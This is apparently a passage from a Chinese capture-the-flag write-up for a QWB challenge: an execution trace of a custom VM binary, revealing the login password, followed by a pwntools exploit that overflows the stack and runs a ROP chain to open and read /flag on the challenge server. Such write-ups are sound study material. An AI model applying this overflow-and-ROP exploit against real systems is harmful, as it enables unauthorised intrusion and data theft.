----------------------------------------
rip: 0x49  mov
mov regs[1],0x1
----------------------------------------
rip: 0x4d  mov
mov regs[2],0x0
----------------------------------------
rip: 0x51  mov
mov regs[3],0x23
----------------------------------------
rip: 0x55  syscall 2
write(1,&data+0,35)
Welcome to QWB! You can login now!
----------------------------------------
rip: 0x57  mov
mov regs[0],0x2
----------------------------------------
rip: 0x5b  mov
mov regs[1],0x1
----------------------------------------
rip: 0x5f  mov
mov regs[2],0x28
----------------------------------------
rip: 0x63  mov
mov regs[3],0xb
----------------------------------------
rip: 0x67  syscall 2
write(1,&data+40,11)
password: 
----------------------------------------
rip: 0x69  mov
mov regs[0],0x1
----------------------------------------
rip: 0x6d  mov
mov regs[1],0x0
----------------------------------------
rip: 0x71  mov
mov regs[2],0x40
----------------------------------------
rip: 0x78  mov
mov regs[3],0x1
----------------------------------------
rip: 0x83  syscall 1
read(0,&data+64,1)
QWQG00DR3VRW31LD0N3Try2Pwn!GOGOGOGO
----------------------------------------
rip: 0x85  mov
mov regs[8],0x51
----------------------------------------
rip: 0x90  cmp
cmp regs[8],0x51
----------------------------------------
rip: 0x94  je
je 0x99
----------------------------------------
rip: 0x99  mov
mov regs[0],0x1
----------------------------------------
rip: 0x9d  mov
mov regs[1],0x0
----------------------------------------
rip: 0xa1  mov
mov regs[2],0x40
----------------------------------------
rip: 0xa5  mov
mov regs[3],0x1
----------------------------------------
rip: 0xa9  syscall 1
read(0,&data+64,1)
----------------------------------------
rip: 0xab  mov
mov regs[8],0x57
----------------------------------------
rip: 0xb6  cmp
cmp regs[8],0x57
----------------------------------------
rip: 0xba  jne
jne 0xc0
----------------------------------------
rip: 0xbd  jmp
jmp 0xc2
----------------------------------------
rip: 0xc2  mov
mov data[64],0x0
----------------------------------------
rip: 0xcd  mov
mov regs[0],0x1
----------------------------------------
rip: 0xd1  mov
mov regs[1],0x0
----------------------------------------
rip: 0xd6  mov
mov regs[2],0x40
----------------------------------------
rip: 0xdb  mov
mov regs[3],0x1
----------------------------------------
rip: 0xdf  syscall 1
read(0,&data+64,1)
----------------------------------------
rip: 0xe1  mov
mov regs[8],0x51
----------------------------------------
rip: 0xec  xor
xor regs[8],0x77
----------------------------------------
rip: 0xf0  cmp
cmp regs[8],0x26
----------------------------------------
rip: 0xf4  jne
jne 0xc0
----------------------------------------
rip: 0xf7  mov
mov data[64],0x0
----------------------------------------
rip: 0x102  mov
mov data[72],0x0
----------------------------------------
rip: 0x10d  mov
mov data[80],0x0
----------------------------------------
rip: 0x118  mov
mov data[88],0x0
----------------------------------------
rip: 0x123  mov
mov data[96],0x0
----------------------------------------
rip: 0x12e  mov
mov regs[0],0x1
----------------------------------------
rip: 0x132  mov
mov regs[1],0x0
----------------------------------------
rip: 0x137  mov
mov regs[2],0x40
----------------------------------------
rip: 0x13c  mov
mov regs[3],0x21
----------------------------------------
rip: 0x140  syscall 1
read(0,&data+64,33)
----------------------------------------
rip: 0x142  xor
xor regs[8],regs[8]
----------------------------------------
rip: 0x146  mov
mov regs[8],0x5256335244303047
----------------------------------------
rip: 0x151  mov
mov regs[9],0x427234129827abcd
----------------------------------------
rip: 0x15c  xor
xor regs[8],regs[9]
----------------------------------------
rip: 0x160  cmp
cmp regs[8],0x10240740dc179b8a
----------------------------------------
rip: 0x16b  je
je 0x170
----------------------------------------
rip: 0x170  xor
xor regs[8],regs[8]
----------------------------------------
rip: 0x174  mov
mov regs[8],0x334e30444c313357
----------------------------------------
rip: 0x17f  mov
mov regs[9],0x127412341241dead
----------------------------------------
rip: 0x18a  xor
xor regs[8],regs[9]
----------------------------------------
rip: 0x18e  cmp
cmp regs[8],0x213a22705e70edfa
----------------------------------------
rip: 0x199  je
je 0x19e
----------------------------------------
rip: 0x19e  xor
xor regs[8],regs[8]
----------------------------------------
rip: 0x1a2  mov
mov regs[8],0x216e775032797254
----------------------------------------
rip: 0x1ad  mov
mov regs[9],0x8634965812abc123
----------------------------------------
rip: 0x1b8  xor
xor regs[8],regs[9]
----------------------------------------
rip: 0x1bc  cmp
cmp regs[8],0xa75ae10820d2b377
----------------------------------------
rip: 0x1c7  je
je 0x1cc
----------------------------------------
rip: 0x1cc  xor
xor regs[8],regs[8]
----------------------------------------
rip: 0x1d0  mov
mov regs[8],0x4f474f474f474f47
----------------------------------------
rip: 0x1db  mov
mov regs[9],0x123216781236789a
----------------------------------------
rip: 0x1e6  xor
xor regs[8],regs[9]
----------------------------------------
rip: 0x1ea  cmp
cmp regs[8],0x5d75593f5d7137dd
----------------------------------------
rip: 0x1f5  je
je 0x1fa
----------------------------------------
rip: 0x1fa  mov
mov regs[0],0x2
----------------------------------------
rip: 0x1fe  mov
mov regs[1],0x1
----------------------------------------
rip: 0x202  mov
mov regs[2],0x34
----------------------------------------
rip: 0x206  mov
mov regs[3],0x6
----------------------------------------
rip: 0x20a  syscall 2
write(1,&data+52,6)
GOOOD
----------------------------------------
rip: 0x20c  push
push regs[17]   or   push 0x0
----------------------------------------
rip: 0x20f  mov
mov regs[17],reg[16]
----------------------------------------
rip: 0x213  sub
sub reg[16],0x100
----------------------------------------
rip: 0x21e  mov
mov regs[4],reg[16]
----------------------------------------
rip: 0x222  mov
mov regs[5],0xa214f474f4721
----------------------------------------
rip: 0x22d  push
push regs[5]   or   push 0xa214f474f4721
----------------------------------------
rip: 0x230  mov
mov regs[5],0x574f4e54494e5750
----------------------------------------
rip: 0x23b  push
push regs[5]   or   push 0x574f4e54494e5750
----------------------------------------
rip: 0x23e  mov
mov regs[5],reg[16]
----------------------------------------
rip: 0x242  mov
mov regs[0],0x2
----------------------------------------
rip: 0x246  mov
mov regs[1],0x1
----------------------------------------
rip: 0x24a  mov
mov regs[2],reg[16]
----------------------------------------
rip: 0x24e  mov
mov regs[3],0xf
----------------------------------------
rip: 0x252  syscall 2
write(1,&data+-256,15)
----------------------------------------
rip: 0x254  mov
mov regs[0],0x1
----------------------------------------
rip: 0x258  mov
mov regs[1],0x0
----------------------------------------
rip: 0x25c  mov
mov regs[2],reg[4]
----------------------------------------
rip: 0x260  mov
mov regs[3],0x800
----------------------------------------
rip: 0x26b  syscall 1
read(0,&data+-256,2048)
aaaaaaaaaaaaaaaaaaaaaaaaaaaa
----------------------------------------
rip: 0x26d  cmp
cmp regs[0],0x0
----------------------------------------
rip: 0x278  jnl
----------------------------------------
rip: 0x27b  hlt
----------------------------------------
rip: 0x27d  mov
mov regs[3],reg[0]
----------------------------------------
rip: 0x281  mov
mov regs[1],0x1
----------------------------------------
rip: 0x285  mov
mov regs[2],reg[4]
----------------------------------------
rip: 0x289  mov
mov regs[0],0x2
----------------------------------------
rip: 0x294  syscall 2
write(1,&data+-256,1)
a----------------------------------------
rip: 0x296  mov
mov regs[16],reg[17]
----------------------------------------
rip: 0x29a  pop
----------------------------------------
rip: 0x29d  ret 0x494e5750        !!! 栈溢出，效果是我们能任意跳到程序的代码段中的某个位置
----------------------------------------
```

test.bin里藏了几个gadget，找到就行

最后exp：

```
from pwn import *

context.arch = 'amd64'

passwd = 'QWQG00DR3VRW31LD0N3Try2Pwn!GOGOGOGO'

# p = process(["./emulator","./test.bin"],aslr=False)
# p = process(["./emulator","./test.bin"])
p = remote("47.94.20.173",32142)
p.recvuntil("password:")
p.send(passwd)

# gdb.attach(p,"b *0x555555554000+0x0000000000113B8")
p.recvuntil("PWNITNOW!GOGO!")

p_r0 = 0x2f5
p_r1 = 0x377
p_r2 = 0x45c
p_r3 = 0x4e1
syscall_ret = 0x5b1

open_syscall_ret = 0x6ed

rop_chain = [
	p_r0,1,p_r1,0,p_r2,0,p_r3,23,syscall_ret,
	p_r0,0,p_r1,0,p_r2,0,open_syscall_ret,
	p_r0,1,p_r1,4,p_r2,0,p_r3,0x40,syscall_ret,
	p_r0,2,p_r1,1,p_r2,0,p_r3,0x40,syscall_ret,
]

payload = "A"*0x108+flat(rop_chain)

p.send(payload)
pause()
p.send("/flag\x00")

p.interactive()
	
	
```

